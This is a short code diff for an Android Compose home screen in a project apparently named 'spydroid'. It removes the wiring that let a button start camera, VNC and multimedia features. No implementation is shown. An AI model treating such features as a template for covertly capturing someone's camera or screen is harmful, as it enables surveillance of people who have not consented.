@@ -46,7 +46,6 @@ import kotlinx.coroutines.launch
 import net.spydroid.core.data.common.LocalGlobalViewModel
 import net.spydroid.core.data.common.GLOBAL_STATES_PERMISSIONS
 import net.spydroid.core.data.common.PERMISSIONS_STATES
-import net.spydroid.core.manager.features.ManagerFeatures
 import net.spydroid.core.ui.components.dialogs.PermissionDialog
 import net.spydroid.core.ui.components.dialogs.dialogDefaults
 
@@ -63,7 +62,7 @@ internal fun HomeScreen(
     var showDialogLocation by remember { mutableStateOf(false) }
     val context = LocalContext.current
 
-    val managerFeatures = remember { ManagerFeatures(context, globalViewModel) }
+    //val managerFeatures = remember { ManagerFeatures(context, globalViewModel) }
 
 
     LaunchedEffect(globalViewModel) {
@@ -118,11 +117,6 @@ internal fun HomeScreen(
             )
 
             Button(onClick = {
-                managerFeatures.also {
-                    it.Camera().start()
-                    it.Vnc().start()
-                    it.Multimedia().start()
-                }
             }) {
                 Text("Iniciar WM")
             }
